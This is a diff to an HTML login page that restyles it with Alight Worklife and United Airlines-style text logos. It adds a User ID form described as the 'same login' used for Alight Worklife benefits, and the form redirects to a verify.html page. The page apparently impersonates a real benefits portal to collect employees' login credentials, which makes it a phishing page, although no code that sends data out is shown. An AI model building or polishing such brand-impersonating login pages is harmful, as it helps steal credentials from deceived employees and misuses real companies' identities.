@@ -15,18 +15,14 @@
             flex-direction: column;
             align-items: center;
             
-            /* Background Image */
             background-image: url('login.jpg');
-            background-size: cover;           /* Covers the whole screen */
-            background-position: center;      /* Centers the image */
-            background-repeat: no-repeat;     /* No tiling */
-            background-attachment: fixed;     /* Stays in place when scrolling */
-            
-            /* Optional dark overlay for better text readability */
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            background-attachment: fixed;
             position: relative;
         }
 
-        /* Dark overlay so text remains readable on the image */
         body::before {
             content: '';
             position: absolute;
@@ -34,7 +30,7 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.45);   /* Adjust darkness (0.3 = lighter, 0.6 = darker) */
+            background: rgba(0, 0, 0, 0.45);
             z-index: -1;
         }
 
@@ -44,31 +40,48 @@
             z-index: 2; 
             position: relative;
         }
-        
-        .logo-container h1 { 
-            font-size: 2.2rem; 
-            font-weight: 700; 
-            color: white;           /* Changed to white for visibility */
-            text-shadow: 0 2px 8px rgba(0,0,0,0.6);
+
+        /* Alight Worklife Logo - Text Version */
+        .alight-worklife {
+            font-size: 2.8rem;
+            font-weight: 700;
+            letter-spacing: -0.02em;
+            margin-bottom: 10px;
         }
-        
-        .logo-container .subtitle { 
-            font-size: 1.8rem; 
-            color: white; 
-            margin-top: 5px;
-            text-shadow: 0 2px 8px rgba(0,0,0,0.6);
+        .alight-worklife .alight {
+            color: #1a1a1a;
         }
-        
-        .sun-icon { 
-            font-size: 3.5rem; 
-            margin: 15px 0; 
+        .alight-worklife .worklife {
+            background: linear-gradient(90deg, #7ed957, #34d399);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            font-weight: 700;
         }
-        
+
+        /* United Logo - Text Version */
+        .united-logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin: 15px 0 20px;
+        }
+        .united-logo .united-text {
+            font-size: 2.4rem;
+            font-weight: 800;
+            color: #0033a0;
+            letter-spacing: 0.05em;
+        }
+        .globe {
+            font-size: 2.6rem;
+            line-height: 1;
+        }
+
         .form-container { 
             width: 100%; 
             max-width: 380px; 
-            background: rgba(255, 255, 255, 0.95);  /* Semi-transparent white box */
-            padding: 30px;
+            background: rgba(255, 255, 255, 0.96);
+            padding: 35px 30px;
             border-radius: 12px;
             box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
             z-index: 2;
@@ -135,15 +148,24 @@
 </head>
 <body>
     <div class="logo-container">
-        <h1>alight</h1>
-        <div class="subtitle">Smart-Choice Accounts®</div>
-        <div class="sun-icon">☀️</div>
+        <!-- Alight Worklife Text Logo -->
+        <div class="alight-worklife">
+            <span class="alight">alight</span>
+            <span class="worklife">worklife</span><span style="font-size:0.6rem; vertical-align: super; color:#1a1a1a;">®</span>
+        </div>
+
+        <!-- United Logo -->
+        <div class="united-logo">
+            <span class="united-text">UNITED</span>
+            <span class="globe">🌐</span>
+        </div>
+
         <div class="worklife">Same login used to access benefits on Alight Worklife Web</div>
     </div>
 
     <div class="form-container">
         <form id="loginForm">
-           <div class="form-group">
+            <div class="form-group">
                 <label for="username">Enter your User ID</label>
                 <input type="text" id="username" placeholder="User ID" required>
                 <small class="helper-text">Same ID used to access benefits on Alight Worklife Web</small>
@@ -187,6 +209,5 @@
             window.location.href = "verify.html";
         });
     </script>
-    <script src="app.js"></script>
 </body>
 </html>
